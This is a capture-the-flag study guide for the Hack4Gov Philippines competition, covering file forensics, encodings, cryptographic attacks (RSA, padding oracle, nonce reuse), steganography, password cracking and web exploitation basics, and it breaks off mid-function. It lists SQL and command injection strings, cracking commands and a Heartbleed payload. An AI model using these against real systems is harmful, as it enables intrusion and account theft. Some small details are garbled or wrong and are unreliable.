# Basic

_Complete Guide for Hack4Gov Philippines_

## Table of Contents

- [Basic CTF Skills](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#basic-ctf-skills)
- [File Analysis](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#file-analysis)
- [Encoding & Decoding](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#encoding--decoding)
- [Cryptography](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#cryptography)
- [Steganography](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#steganography)
- [Password Cracking](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#password-cracking)
- [Web Exploitation Basics](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#web-exploitation-basics)
- [Useful Commands & Scripts](https://claude.ai/chat/21244d25-2816-4b47-90ce-84df27db2356#useful-commands--scripts)

---

## Basic CTF Skills

### Essential First Steps

1. **File Identification**
    
    ```bash
    file [filename]                    # Determine file type
    binwalk [filename]                  # Analyze for embedded files
    xxd [filename] | head -20           # View hex dump
    hexdump -C [filename] | head -20    # Alternative hex view
    ```
    
    **Why this matters**: Challenge creators often disguise files by changing extensions. A `.txt` file might actually be a PNG image or an ELF binary.
    
2. **String Extraction**
    
    ```bash
    strings -a [filename]               # Extract all strings
    strings -n 10 [filename]            # Minimum 10 character strings
    strings [filename] | grep flag      # Search for flag patterns
    strings [filename] | grep -i ctf    # Case-insensitive search
    ```
    
3. **Binary Analysis**
    
    ```bash
    objdump -d [binary]                 # Disassemble binary
    ltrace ./[binary]                   # Library call trace
    strace ./[binary]                   # System call trace
    gdb [binary]                        # GNU debugger
    radare2 [binary]                    # Advanced binary analysis
    ```
    

### File Signatures (Magic Numbers)

Common file signatures to recognize:

|File Type|Hex Signature|ASCII|
|---|---|---|
|PNG|`89 50 4E 47`|`.PNG`|
|JPEG|`FF D8 FF`|`ÿØÿ`|
|PDF|`25 50 44 46`|`%PDF`|
|ZIP/JAR|`50 4B 03 04`|`PK..`|
|ELF|`7F 45 4C 46`|`.ELF`|
|PE/EXE|`4D 5A`|`MZ`|
|RAR|`52 61 72 21`|`Rar!`|
|GIF|`47 49 46 38`|`GIF8`|

**Fixing corrupted headers**:

```bash
# Example: Fix PNG header
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd of=corrupted.png bs=1 seek=0 count=8 conv=notrunc
```

---

## File Analysis

### Advanced File Analysis Tools

```bash
# Metadata extraction
exiftool [filename]                 # Extract metadata
pngcheck [filename.png]             # Check PNG integrity
jpeginfo [filename.jpg]             # Check JPEG integrity

# File carving and recovery
foremost -i [file] -o output_dir    # Carve files from disk image
scalpel [file]                      # Alternative file carver
photorec [file]                     # Recover deleted files

# Archive handling
7z l [archive]                      # List archive contents
unrar x [file.rar]                  # Extract RAR
tar -xvf [file.tar]                 # Extract TAR
```

---

## Encoding & Decoding

### Common Encodings

1. **Base64**
    
    ```bash
    # Encode
    echo -n "text" | base64
    
    # Decode
    echo "dGV4dA==" | base64 -d
    
    # Decode file
    base64 -d encoded.txt > decoded.bin
    ```
    
    **Characteristics**: Uses A-Z, a-z, 0-9, +, / and = for padding
    
2. **Base32**
    
    ```bash
    echo -n "text" | base32             # Encode
    echo "ORSXG5A=" | base32 -d         # Decode
    ```
    
    **Characteristics**: Uses A-Z, 2-7 and = for padding
    
3. **Hexadecimal**
    
    ```bash
    # Text to hex
    echo -n "flag" | xxd -p
    
    # Hex to text
    echo "666c6167" | xxd -r -p
    ```
    
4. **URL Encoding**
    
    ```bash
    # Decode URL
    python3 -c "import urllib.parse; print(urllib.parse.unquote('%66%6C%61%67'))"
    ```
    
5. **ASCII85**
    
    ```python
    import base64
    # Encode
    base64.a85encode(b'flag')
    # Decode
    base64.a85decode(b'<~9PJE~>')
    ```
    

### Number Systems Conversion

```python
# Python quick conversions
bin(42)        # Decimal to binary: '0b101010'
hex(42)        # Decimal to hex: '0x2a'
oct(42)        # Decimal to octal: '0o52'

int('101010', 2)   # Binary to decimal: 42
int('2a', 16)      # Hex to decimal: 42
int('52', 8)       # Octal to decimal: 42

# ASCII conversions
ord('A')           # Character to ASCII: 65
chr(65)            # ASCII to character: 'A'
```

---

## Cryptography

### Classical Ciphers

1. **Caesar Cipher / ROT13**
    
    ```bash
    # ROT13
    echo "flag" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    
    # Custom rotation (ROT-X)
    python3 -c "
    text = 'encrypted'
    for shift in range(26):
        result = ''
        for char in text:
            if char.isalpha():
                ascii_offset = ord('a') if char.islower() else ord('A')
                result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
            else:
                result += char
        print(f'ROT-{shift}: {result}')
    "
    ```
    
2. **XOR Cipher**
    
    ```python
    # Single byte XOR brute force
    def xor_brute(ciphertext):
        for key in range(256):
            result = ''.join([chr(c ^ key) for c in ciphertext])
            if 'flag' in result.lower():
                print(f"Key: {key}, Result: {result}")
    
    # Multi-byte XOR
    def xor_decrypt(data, key):
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    ```
    
3. **Vigenère Cipher**
    
    - Use online tools like https://www.guballa.de/vigenere-solver
    - Or use Python with `pycipher` library

### Modern Cryptography

#### RSA

```bash
# Generate RSA keys
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Extract modulus and exponent
openssl rsa -in public.pem -pubin -text -noout

# Encrypt with public key
openssl rsautl -encrypt -pubin -inkey public.pem -in plaintext.txt -out encrypted.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out decrypted.txt
```

**Common RSA Attacks**:

- **Small exponent attack** (e=3)
- **Wiener's attack** (small private exponent)
- **Common modulus attack**
- **Fermat factorization**

Tools for RSA:

```bash
# RsaCtfTool - Automatic RSA attack tool
python3 RsaCtfTool.py --publickey public.pem --uncipherfile cipher.bin

# FactorDB - Check if N is already factored
# Visit: http://factordb.com
```

#### AES

```bash
# AES-256-CBC encryption
openssl enc -aes-256-cbc -salt -in plaintext.txt -out encrypted.bin -k password

# AES-256-CBC decryption
openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt -k password

# With base64 encoding
openssl enc -aes-256-cbc -a -salt -in plaintext.txt -out encrypted.b64 -k password

# Using key and IV
openssl enc -aes-256-cbc -in plain.txt -out cipher.bin -K [hex_key] -iv [hex_iv]
```

#### Hash Cracking

```bash
# Identify hash type
hashid [hash]
hash-identifier

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=raw-md5 --wordlist=wordlist.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 0 -a 0 hash.txt wordlist.txt    # MD5
hashcat -m 100 -a 0 hash.txt wordlist.txt  # SHA1
hashcat -m 1400 -a 0 hash.txt wordlist.txt # SHA256

# Online tools
# - https://crackstation.net/
# - https://hashes.com/en/decrypt/hash
# - https://md5decrypt.net/
```

### Cryptography Tools Summary

**Online Tools:**

- **CyberChef**: https://gchq.github.io/CyberChef/ (Swiss army knife)
- **dCode**: https://www.dcode.fr/ (Multiple cipher solvers)
- **Quipqiup**: https://quipqiup.com/ (Substitution cipher solver)
- **Cryptii**: https://cryptii.com/ (Encoding/Decoding)
- **Boxentriq**: https://www.boxentriq.com/ (Cipher identifier)

**Offline Tools:**

- **Ciphey**: Automatic decryption tool
    
    ```bash
    pip3 install cipheyciphey -f encrypted.txt
    ```
    
- **CrypTool**: GUI-based cryptanalysis
- **SageMath**: Mathematical cryptanalysis

---

## Steganography

### Image Steganography

```bash
# Basic analysis
file image.png
exiftool image.png
strings image.png

# Steganography tools
steghide extract -sf image.jpg              # Extract hidden data
stegsolve image.png                         # GUI tool for analysis
zsteg image.png                            # PNG steganography
zsteg -a image.png                         # Try all methods
binwalk -e image.png                       # Extract embedded files
foremost image.png                         # File carving

# LSB steganography
stegpy image.png                           # Python LSB tool
python3 lsb.py extract image.png output.txt

# Check image planes
convert image.png -channel R -separate red.png
convert image.png -channel G -separate green.png
convert image.png -channel B -separate blue.png
```

### Audio Steganography

```bash
# Analyze audio files
sox audio.wav -n stat
sox audio.wav -n spectrogram              # Generate spectrogram
audacity audio.wav                        # GUI analysis

# Extract hidden data
hideme audio.wav -x
deepsound                                 # Windows tool
```

### Text Steganography

- **Whitespace steganography**: Hidden in spaces/tabs
- **Zero-width characters**: Unicode steganography
- **Bacon cipher**: Binary encoding using two fonts

---

## Password Cracking

### Archive Password Cracking

```bash
# ZIP files
fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt file.zip
fcrackzip -b -c 'aA1!' -l 1-10 file.zip   # Brute force
john --format=zip file.zip

# RAR files
rarcrack file.rar --threads 4 --type rar
john --format=rar file.rar

# 7z files
7z2john file.7z > hash.txt
john hash.txt

# PDF passwords
pdfcrack -f file.pdf -w wordlist.txt
john --format=pdf file.pdf
```

### Creating Custom Wordlists

```bash
# Cewl - scrape website for words
cewl -d 2 -m 5 -w wordlist.txt https://example.com

# Crunch - generate wordlist
crunch 8 8 -t flag@@@@ -o wordlist.txt    # flag0000 to flag9999

# John mutations
john --wordlist=base.txt --rules --stdout > mutated.txt
```

---

## Web Exploitation Basics

### Common Web CTF Techniques

```bash
# Directory/file discovery
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
dirb http://target.com
ffuf -w wordlist.txt -u http://target.com/FUZZ

# Check robots.txt, sitemap.xml, .git, .svn, .DS_Store

# View source code
curl -s http://target.com | grep -i flag
curl -s http://target.com | grep -i <!--  # HTML comments

# Check headers
curl -I http://target.com
curl -v http://target.com

# SQL Injection basic test
' OR '1'='1
admin' --
' UNION SELECT null,null,null--

# Command injection
; ls
| ls
&& ls
|| ls
$(ls)
`ls`
```

---

## Useful Commands & Scripts

### Quick Python Scripts

**Frequency Analysis**:

```python
from collections import Counter
text = "encrypted_text_here"
freq = Counter(text.lower())
for char, count in freq.most_common():
    print(f"{char}: {count} ({count/len(text)*100:.2f}%)")
```

**Connect to Service**:

```python
from pwn import *
r = remote('ctf.example.com', 1337)
r.recvuntil(b'>')
r.sendline(b'answer')
print(r.recvline())
```

**Brute Force Script Template**:

```python
import requests
import string

charset = string.ascii_letters + string.digits + '_'
flag = 'flag{'

while not flag.endswith('}'):
    for char in charset:
        test = flag + char
        r = requests.get(f'http://target.com?input={test}')
        if 'correct' in r.text:
            flag += char
            print(f"Found: {flag}")
            break
```

### Bash One-Liners

```bash
# Find all base64 strings in file
grep -oE '[A-Za-z0-9+/]{4,}={0,2}' file.txt

# Extract all IP addresses
grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt

# Hex to ASCII
echo "48656c6c6f" | xxd -r -p

# Monitor file changes
watch -n 1 'ls -la'

# Quick HTTP server
python3 -m http.server 8080
```

---

## CTF Strategy Tips

1. **Flag Format**: Usually `flag{...}`, `CTF{...}`, or custom format specified in rules
2. **Check Everything**: Comments, metadata, headers, cookies, source code
3. **Try Common Passwords**: admin, password, 123456, etc.
4. **Version Control**: Check for `.git`, `.svn` folders
5. **Documentation**: Keep notes of what you've tried
6. **Collaboration**: Work with teammates, divide tasks
7. **Time Management**: Don't get stuck on one challenge too long
8. **Learn from Writeups**: Read solutions after CTF ends

---

## Resources

### Learning Platforms

- PicoCTF: https://picoctf.org/
- OverTheWire: https://overthewire.org/
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- Root Me: https://www.root-me.org/

### Reference Materials

- GTFOBins: https://gtfobins.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- CTF101: https://ctf101.org/

### Philippine CTF Community

- Follow local CTF groups and competitions
- Join Discord/Telegram communities
- Participate in Hack4Gov challenges

---

_Remember: Practice makes perfect. Start with easy challenges and gradually increase difficulty. Good luck with Hack4Gov!_

---

# Cryptography

## Quick Reference Tools & Commands

### Essential Online Tools

- **CyberChef**: https://gchq.github.io/CyberChef/ (Swiss army knife for crypto)
- **dCode**: https://www.dcode.fr/en (Cipher identifier and solver)
- **Boxentriq**: https://www.boxentriq.com/code-breaking (Classical cipher analysis)
- **factordb.com**: Factor large numbers
- **RsaCtfTool**: https://github.com/RsaCtfTool/RsaCtfTool (RSA attacks)

### Python Libraries

```python
from Crypto.Cipher import AES, DES, RSA
from Crypto.PublicKey import RSA
from Crypto.Util.number import *
import gmpy2
import hashlib
import base64
import binascii
```

## 1. Encoding Recognition & Conversion

### Base Encodings

```bash
# Base64
echo "text" | base64                    # Encode
echo "dGV4dA==" | base64 -d            # Decode

# Base32
echo "text" | base32                    # Encode
echo "ORSXG5A=" | base32 -d            # Decode

# Hex
echo -n "text" | xxd -p                 # To hex
echo "74657874" | xxd -r -p            # From hex
```

### Python Quick Converters

```python
# Hex to ASCII
bytes.fromhex("48656c6c6f").decode('ascii')

# Binary to ASCII
int('01001000', 2).to_bytes(1, 'big').decode()

# Base64
import base64
base64.b64encode(b"text")
base64.b64decode(b"dGV4dA==")
```

### Common Encodings to Check

- **Base64**: Contains A-Z, a-z, 0-9, +, /, = padding
- **Base32**: Contains A-Z, 2-7, = padding
- **Hex**: Contains 0-9, A-F
- **Binary**: Only 0 and 1
- **URL Encoding**: Contains %XX patterns
- **Morse Code**: Dots and dashes (. -)
- **ROT13/47**: Shifted alphabet/ASCII

## 2. Classical Ciphers

### Caesar/ROT Cipher

```python
def caesar_decrypt(ciphertext, shift):
    result = ""
    for char in ciphertext:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
        else:
            result += char
    return result

# Try all shifts
for i in range(26):
    print(f"{i}: {caesar_decrypt(ciphertext, i)}")
```

### Vigenere Cipher

```python
def vigenere_decrypt(ciphertext, key):
    plaintext = []
    key = key.upper()
    key_index = 0
    
    for char in ciphertext.upper():
        if char.isalpha():
            shift = ord(key[key_index % len(key)]) - 65
            plaintext.append(chr((ord(char) - 65 - shift) % 26 + 65))
            key_index += 1
        else:
            plaintext.append(char)
    return ''.join(plaintext)
```

### Substitution Cipher Analysis

- **Frequency Analysis**: E is most common (12.7%), followed by T, A, O, I, N
- **Common bigrams**: TH, HE, IN, ER, AN
- **Common trigrams**: THE, AND, ING, HER, HAT
- Use quipqiup.com for automated solving

### Rail Fence Cipher

```python
def rail_fence_decrypt(ciphertext, rails):
    fence = [[] for _ in range(rails)]
    rail = 0
    direction = 1
    
    for char in ciphertext:
        fence[rail].append(None)
        rail += direction
        if rail == rails - 1 or rail == 0:
            direction = -direction
    
    # Fill the fence
    index = 0
    for rail in range(rails):
        for i in range(len(fence[rail])):
            fence[rail][i] = ciphertext[index]
            index += 1
    
    # Read off the plaintext
    rail = 0
    direction = 1
    plaintext = []
    for _ in range(len(ciphertext)):
        plaintext.append(fence[rail].pop(0))
        rail += direction
        if rail == rails - 1 or rail == 0:
            direction = -direction
    
    return ''.join(plaintext)
```

## 3. XOR Operations

### Single-byte XOR

```python
def single_byte_xor(data, key):
    return bytes([b ^ key for b in data])

# Brute force single-byte XOR
def bruteforce_single_xor(ciphertext):
    for key in range(256):
        decrypted = single_byte_xor(ciphertext, key)
        if all(32 <= b < 127 for b in decrypted):  # Printable ASCII
            print(f"Key {key}: {decrypted}")
```

### Repeating-key XOR

```python
def repeating_xor(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

# Find key length using Hamming distance
def hamming_distance(b1, b2):
    return sum(bin(b1[i] ^ b2[i]).count('1') for i in range(len(b1)))

def find_keysize(ciphertext, max_keysize=40):
    distances = []
    for keysize in range(2, max_keysize):
        chunks = [ciphertext[i:i+keysize] for i in range(0, len(ciphertext)-keysize*3, keysize)][:4]
        dist = sum(hamming_distance(chunks[i], chunks[j]) 
                  for i in range(len(chunks)) 
                  for j in range(i+1, len(chunks)))
        normalized = dist / (keysize * len(chunks) * (len(chunks)-1) / 2)
        distances.append((normalized, keysize))
    return sorted(distances)[:5]
```

### Known-plaintext XOR Attack

```python
def xor_known_plaintext(ciphertext, known_plaintext):
    # If we know part of the plaintext
    key = bytes([ciphertext[i] ^ known_plaintext[i] for i in range(len(known_plaintext))])
    return key
```

## 4. RSA Attacks

### Common RSA Vulnerabilities

#### Small e Attack (e=3)

```python
import gmpy2
def small_e_attack(c, e=3):
    m = gmpy2.iroot(c, e)
    if m[1]:  # Perfect root found
        return m[0]
```

#### Wiener's Attack (small d)

```python
# Use RsaCtfTool or implement continued fractions
# Applicable when d < N^0.25
```

#### Common Modulus Attack

```python
def common_modulus_attack(c1, c2, e1, e2, n):
    # When same n, different e
    g, x, y = gmpy2.gcdext(e1, e2)
    if g != 1:
        return None
    
    if x < 0:
        c1 = gmpy2.invert(c1, n)
        x = -x
    if y < 0:
        c2 = gmpy2.invert(c2, n)
        y = -y
    
    m = (pow(c1, x, n) * pow(c2, y, n)) % n
    return m
```

#### Factorization Methods

```python
# Fermat factorization (when p and q are close)
def fermat_factor(n):
    a = gmpy2.isqrt(n) + 1
    b2 = a*a - n
    while not gmpy2.is_square(b2):
        a += 1
        b2 = a*a - n
    b = gmpy2.isqrt(b2)
    return a - b, a + b

# Pollard's rho
def pollard_rho(n):
    x = 2
    y = 2
    d = 1
    f = lambda x: (x**2 + 1) % n
    
    while d == 1:
        x = f(x)
        y = f(f(y))
        d = gmpy2.gcd(abs(x - y), n)
    
    return d if d != n else None
```

### RSA Decryption Template

```python
from Crypto.Util.number import inverse, long_to_bytes

# Given n, e, c, and either p,q or d or phi
def rsa_decrypt(n, e, c, p=None, q=None, d=None, phi=None):
    if p and q:
        phi = (p - 1) * (q - 1)
        d = inverse(e, phi)
    elif phi and not d:
        d = inverse(e, phi)
    elif not d:
        return None
    
    m = pow(c, d, n)
    return long_to_bytes(m)
```

## 5. Block Ciphers

### AES Modes

#### ECB Mode Detection

```python
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))  # Duplicate blocks indicate ECB
```

#### CBC Bit Flipping

```python
# To flip bit at position i in plaintext block n:
# Flip corresponding bit in ciphertext block n-1
def cbc_bit_flip(ciphertext, block_num, byte_pos, bit_pos):
    blocks = [ciphertext[i:i+16] for i in range(0, len(ciphertext), 16)]
    block = bytearray(blocks[block_num - 1])
    block[byte_pos] ^= (1 << bit_pos)
    blocks[block_num - 1] = bytes(block)
    return b''.join(blocks)
```

#### Padding Oracle Attack

```python
# Basic structure - requires oracle function that returns True/False for valid padding
def padding_oracle_block(oracle, prev_block, cipher_block):
    intermediate = bytearray(16)
    decrypted = bytearray(16)
    
    for byte_idx in range(15, -1, -1):
        padding_value = 16 - byte_idx
        test_block = bytearray(16)
        
        # Set known bytes
        for i in range(byte_idx + 1, 16):
            test_block[i] = intermediate[i] ^ padding_value
        
        # Brute force current byte
        for test_byte in range(256):
            test_block[byte_idx] = test_byte
            if oracle(bytes(test_block) + cipher_block):
                if byte_idx == 15 or test_byte != intermediate[byte_idx + 1] ^ (padding_value - 1):
                    intermediate[byte_idx] = test_byte ^ padding_value
                    decrypted[byte_idx] = intermediate[byte_idx] ^ prev_block[byte_idx]
                    break
    
    return bytes(decrypted)
```

## 6. Hash Functions

### Hash Identification

- **MD5**: 32 hex chars (128 bits)
- **SHA1**: 40 hex chars (160 bits)
- **SHA256**: 64 hex chars (256 bits)
- **SHA512**: 128 hex chars (512 bits)

### Hash Cracking

```bash
# Using hashcat
hashcat -m 0 hash.txt wordlist.txt      # MD5
hashcat -m 100 hash.txt wordlist.txt    # SHA1
hashcat -m 1400 hash.txt wordlist.txt   # SHA256

# Using john
john --format=raw-md5 hash.txt
john --format=raw-sha1 hash.txt
john --wordlist=wordlist.txt hash.txt
```

### Length Extension Attack

```python
# For vulnerable hashes (MD5, SHA1, SHA256)
# Use hashpump tool
import subprocess

def length_extension_attack(original_sig, original_data, append_data, key_length):
    result = subprocess.run(
        ['hashpump', '-s', original_sig, '-d', original_data, 
         '-a', append_data, '-k', str(key_length)],
        capture_output=True, text=True
    )
    return result.stdout.strip().split('\n')
```

## 7. Random Number Generators

### Mersenne Twister Prediction

```python
# After observing 624 outputs
from mt19937predictor import MT19937Predictor

predictor = MT19937Predictor()
for output in observed_outputs:
    predictor.setrandbits(output, 32)
    
next_random = predictor.getrandbits(32)
```

### LCG (Linear Congruential Generator)

```python
# X(n+1) = (a * X(n) + c) mod m
# Given consecutive outputs, recover parameters

def crack_lcg(outputs):
    # Differences between consecutive outputs
    diffs = [outputs[i+1] - outputs[i] for i in range(len(outputs)-1)]
    
    # Find modulus (gcd of differences of differences)
    m = abs(diffs[0] * diffs[2] - diffs[1] * diffs[1])
    for i in range(1, len(diffs)-2):
        m = gmpy2.gcd(m, abs(diffs[i] * diffs[i+2] - diffs[i+1] * diffs[i+1]))
    
    # Find multiplier
    a = (outputs[2] - outputs[1]) * gmpy2.invert(outputs[1] - outputs[0], m) % m
    
    # Find increment
    c = (outputs[1] - a * outputs[0]) % m
    
    return a, c, m
```

## 8. Elliptic Curve Cryptography

### Basic Operations

```python
# Point addition on curve y^2 = x^3 + ax + b (mod p)
def point_add(P, Q, a, p):
    if P is None:
        return Q
    if Q is None:
        return P
    
    x1, y1 = P
    x2, y2 = Q
    
    if x1 == x2:
        if y1 == y2:
            # Point doubling
            s = (3 * x1**2 + a) * gmpy2.invert(2 * y1, p) % p
        else:
            return None  # Point at infinity
    else:
        s = (y2 - y1) * gmpy2.invert(x2 - x1, p) % p
    
    x3 = (s**2 - x1 - x2) % p
    y3 = (s * (x1 - x3) - y1) % p
    
    return (x3, y3)

# Scalar multiplication
def point_mult(k, P, a, p):
    if k == 0:
        return None
    if k == 1:
        return P
    
    Q = None
    while k > 0:
        if k & 1:
            Q = point_add(Q, P, a, p)
        P = point_add(P, P, a, p)
        k >>= 1
    
    return Q
```

## 9. Steganography & Forensics

### Common Stego Tools

```bash
# Strings extraction
strings file.bin | grep flag

# File carving
binwalk -e file.bin
foremost -i file.bin

# Image stego
steghide extract -sf image.jpg
stegsolve.jar  # GUI tool for image analysis
zsteg image.png  # PNG/BMP stego detection

# Audio stego
sonic-visualiser  # Spectrogram analysis
audacity  # Audio manipulation

# LSB extraction
from PIL import Image
def extract_lsb(image_path):
    img = Image.open(image_path)
    pixels = img.load()
    bits = []
    
    for y in range(img.height):
        for x in range(img.width):
            pixel = pixels[x, y]
            for channel in pixel[:3]:  # RGB
                bits.append(str(channel & 1))
    
    # Convert bits to bytes
    message = ''
    for i in range(0, len(bits), 8):
        byte = ''.join(bits[i:i+8])
        message += chr(int(byte, 2))
        if message.endswith('\x00'):
            break
    
    return message
```

## 10. Quick Wins & Common Patterns

### Flag Formats

- Look for: `flag{...}`, `FLAG{...}`, `CTF{...}`, `HTB{...}`
- Base64 encoded flags often end with `=` padding
- Hex flags are often 32, 64, or 128 chars

### Common Tricks

1. **Check for magic bytes**: Files may have wrong extensions
2. **Try reverse**: Reverse the string/hex/base64
3. **Check all encodings**: Chain multiple encodings
4. **Look for patterns**: Repeating blocks indicate ECB
5. **Frequency analysis**: For substitution ciphers
6. **Known plaintext**: "flag{" often appears at start
7. **Timing attacks**: For side-channel vulnerabilities
8. **Weak keys**: Small e (3, 65537), weak primes, reused k in DSA

### Python One-Liners

```python
# ROT all
print('\n'.join([f"ROT{i}: {''.join([chr((ord(c)-65+i)%26+65) if c.isupper() else chr((ord(c)-97+i)%26+97) if c.islower() else c for c in text])}" for i in range(26)]))

# XOR with single byte
print('\n'.join([f"{i:3}: {''.join([chr(ord(c)^i) if 32<=ord(c)^i<127 else '.' for c in text])}" for i in range(256)]))

# From hex
''.join([chr(int(text[i:i+2], 16)) for i in range(0, len(text), 2)])

# To binary
' '.join([bin(ord(c))[2:].zfill(8) for c in text])
```

## Tools Installation Quick Reference

```bash
# Essential tools
pip install pycryptodome gmpy2 mt19937predictor
apt-get install hashcat john binwalk foremost steghide

# RSA tools
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
git clone https://github.com/p4-team/ctf-tasks.git

# Crypto libraries
pip install z3-solver sage sympy
```

---

**Pro Tips:**

1. Always try the simple things first (base64, ROT13, XOR with common keys)
2. Look for patterns and repetitions
3. Keep notes on what you've tried
4. Use CyberChef for quick prototyping
5. If stuck, enumerate: key sizes, block sizes, hash types
6. Check for weak implementations before complex attacks
7. Philippine CTFs often include local references - try Filipino words as keys

Good luck at Hack4Gov! 🚩

## 11. Advanced RSA Attacks

### Hastad's Broadcast Attack

```python
# When same message encrypted with same small e to different moduli
def hastad_broadcast(ciphertexts, moduli, e):
    # Chinese Remainder Theorem
    M = 1
    for n in moduli:
        M *= n
    
    result = 0
    for c, n in zip(ciphertexts, moduli):
        Mi = M // n
        yi = gmpy2.invert(Mi, n)
        result = (result + c * Mi * yi) % M
    
    m = gmpy2.iroot(result, e)[0]
    return long_to_bytes(m)
```

### Partial Key Exposure

```python
# When you know some bits of p or q
# Use Coppersmith's attack (sage implementation)
def partial_p_exposure(n, e, p_partial, bit_length):
    # If you know MSBs or LSBs of p
    # Use sage's small_roots() method
    pass  # Requires SageMath
```

### RSA with Related Primes

```python
# When p and q share bits or have special form
# p = 2^a * r + 1, q = 2^b * s + 1
def related_primes_attack(n):
    # Try powers of 2 factorization
    for i in range(2, 1000):
        g = gmpy2.gcd(2**i - 1, n)
        if g > 1 and g < n:
            return g, n // g
```

## 12. DLP (Discrete Logarithm Problem)

### Baby-step Giant-step

```python
import math

def baby_giant_step(g, h, p):
    # Solve g^x = h (mod p)
    m = math.ceil(math.sqrt(p))
    
    # Baby steps: g^j for j in [0, m)
    baby_steps = {}
    g_j = 1
    for j in range(m):
        baby_steps[g_j] = j
        g_j = (g_j * g) % p
    
    # Giant steps: h * (g^-m)^i
    g_minus_m = pow(gmpy2.invert(g, p), m, p)
    gamma = h
    for i in range(m):
        if gamma in baby_steps:
            return i * m + baby_steps[gamma]
        gamma = (gamma * g_minus_m) % p
    
    return None
```

### Pollard's Rho for DLP

```python
def pollard_rho_dlp(g, h, p, order):
    # Three-way partition function
    def f(x, a, b):
        if x % 3 == 0:
            return (x * x) % p, (a * 2) % order, (b * 2) % order
        elif x % 3 == 1:
            return (x * g) % p, (a + 1) % order, b
        else:
            return (x * h) % p, a, (b + 1) % order
    
    # Tortoise and hare
    x1, a1, b1 = 1, 0, 0
    x2, a2, b2 = 1, 0, 0
    
    while True:
        x1, a1, b1 = f(x1, a1, b1)
        x2, a2, b2 = f(*f(x2, a2, b2))
        
        if x1 == x2:
            r = (b2 - b1) % order
            if r != 0:
                return ((a1 - a2) * gmpy2.invert(r, order)) % order
            break
    
    return None
```

## 13. AES Advanced Attacks

### Meet-in-the-Middle Attack (2DES/2AES)

```python
def meet_in_middle_2des(plaintext, ciphertext, key_size=56):
    # For double encryption
    middle_values = {}
    
    # Forward encryption from plaintext
    for key1 in range(2**key_size):
        mid = des_encrypt(plaintext, key1)
        middle_values[mid] = key1
    
    # Backward decryption from ciphertext
    for key2 in range(2**key_size):
        mid = des_decrypt(ciphertext, key2)
        if mid in middle_values:
            return middle_values[mid], key2
```

### AES-CTR Nonce Reuse

```python
def ctr_nonce_reuse_attack(c1, c2, p1_known=None):
    # If same nonce used, keystream is reused
    # c1 XOR c2 = p1 XOR p2
    if p1_known:
        p2 = xor(xor(c1, c2), p1_known)
        return p2
    else:
        # Try crib dragging
        xor_result = xor(c1, c2)
        # Look for common words XORed
        return crib_drag(xor_result)
```

## 14. Digital Signatures

### DSA Nonce Reuse

```python
def dsa_nonce_reuse(sig1, sig2, msg1, msg2, p, q, g):
    r1, s1 = sig1
    r2, s2 = sig2
    
    if r1 != r2:
        return None  # Different k values
    
    h1 = int(hashlib.sha1(msg1).hexdigest(), 16)
    h2 = int(hashlib.sha1(msg2).hexdigest(), 16)
    
    # Calculate k
    k = ((h1 - h2) * gmpy2.invert(s1 - s2, q)) % q
    
    # Calculate private key
    x = ((s1 * k - h1) * gmpy2.invert(r1, q)) % q
    
    return x
```

### ECDSA Weak Nonce

```python
def ecdsa_weak_nonce_attack(r, s, h, pub_key, curve_order):
    # Biased nonce attack
    # If k is small or predictable
    for k in range(1, 2**16):  # Try small k values
        x = ((s * k - h) * gmpy2.invert(r, curve_order)) % curve_order
        # Verify with public key
        if verify_private_key(x, pub_key):
            return x
```

## 15. Network Crypto Attacks

### SSL/TLS Vulnerabilities

```python
# Heartbleed memory leak pattern
heartbleed_payload = b'\x18\x03\x02\x00\x03\x01\x40\x00'

# BEAST attack (CBC with predictable IVs)
def beast_attack_block(known_prefix, target_byte_pos):
    # Requires chosen plaintext capability
    # Manipulate alignment to isolate target byte
    pass

# CRIME attack (compression oracle)
def crime_compression_oracle(prefix, candidate):
    # Measure compressed size with different candidates
    # Correct guess compresses better
    pass
```

### Timing Attack Template

```python
import time

def timing_attack_compare(secret, max_len=32):
    discovered = ""
    
    for pos in range(max_len):
        timings = {}
        
        for char in range(256):
            test = discovered + chr(char)
            times = []
            
            for _ in range(100):  # Multiple measurements
                start = time.perf_counter_ns()
                check_function(test)  # Your target function
                end = time.perf_counter_ns()
                times.append(end - start)
            
            timings[char] = statistics.median(times)
        
        # Character with longest time is likely correct
        best_char = max(timings, key=timings.get)
        discovered += chr(best_char)
        
        if check_function(discovered):
            return discovered
```

## 16. Philippine/Regional Context

### Common Filipino Crypto Patterns

```python
# Common passwords/keys in PH CTFs
filipino_wordlist = [
    "kalayaan", "bayanihan", "mabuhay", "pilipinas", 
    "manila", "makati", "barangay", "jeepney",
    "hack4gov", "dost", "dict", "cybersecurity"
]

# Historical ciphers
def rizal_cipher(text):
    # Based on José Rizal's correspondence
